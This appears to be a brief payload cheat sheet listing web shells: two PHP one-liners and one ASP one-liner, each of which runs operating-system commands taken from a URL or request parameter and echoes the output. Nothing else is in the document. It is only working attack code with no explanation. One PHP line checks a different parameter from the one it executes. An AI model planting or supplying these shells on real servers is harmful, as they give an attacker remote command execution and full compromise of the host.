## PHP

<?php echo shell_exec($_GET['test'].' 2>&1'); ?>
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['test']); system($cmd); echo "</pre>"; die; }?>

## ASP

<%response.write CreateObject("WScript.Shell").Exec(Request.QueryString("test")).StdOut.Readall()%>
